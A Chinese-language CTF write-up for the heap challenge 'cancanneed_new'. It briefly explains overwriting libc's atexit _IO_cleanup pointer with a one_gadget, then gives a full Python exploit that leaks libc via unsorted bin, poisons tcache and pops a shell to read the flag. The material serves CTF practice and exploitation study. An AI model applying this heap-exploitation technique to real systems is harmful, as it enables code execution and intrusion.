---
date: 2024-10-10 23:12
challenge: cancanneed_new
tags:
  - IO
---

这道题比较抽象，在 gift 功能中会将 libc 里的一段只读区域设置为可写的，可以通过爆破 + 调试找到其中在 exit 时会调用的函数指针，覆写为 `one_gadget` 实现利用。

> [!info]
> 这里很麻烦的一点是 gift 函数里限时 10 秒，但是交互 1000 次需要不少时间，远程总是差一点，跑很多遍终于出来了

实际上这里打的是 `__elf_set___libc_atexit_element__IO_cleanup__` 函数指针，原先这里存放的是 `_IO_cleanup` 函数地址，覆盖为 `one_gadget` 则会在 exit 时调用任意地址：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

context.log_level = "info"


def cmd(choice):
    ru(b"Your Choice: \n")
    sl(i2b(choice))


def win_gift():
    cmd(666)
    ru(b"But,you have to win it by yourself\n")
    sl(i2b(1))
    for i in range(1000):
        res = eval(ru(b"= ?", drop=True))
        sl(i2b(res))
        if i % 100 == 0:
            lg(b"i", i)
    ru(b"Now,you have earned your award!\n")


def add(size, data):
    cmd(1)
    ru(b"please tell me how much you want to have:\n")
    sl(i2b(size))
    ru(b"Content:\n")
    s(data)


def delet(idx):
    cmd(2)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))
    ru(b"What do you want?\n")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Please give me idx:\n")
    sl(i2b(idx))


for i in range(8):
    add(0x90, b"a")

add(0x90, b"b")
for i in range(8):
    delet(i)
show(7)
ru(b"info:\n")
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1ECBE0
lg("libc_base", libc_base)

edit(6, p64(libc_base + 0x1E9000 - 0x80 * 15))
add(0x90, b"a")
win_gift()

one_hook = libc_base + 0xE3AFE
lg("one_hook", one_hook)
add(0x90, p64(one_hook) * (0x88 // 8))

cmd(5)
sl(b"cat /flag")

ia()
```
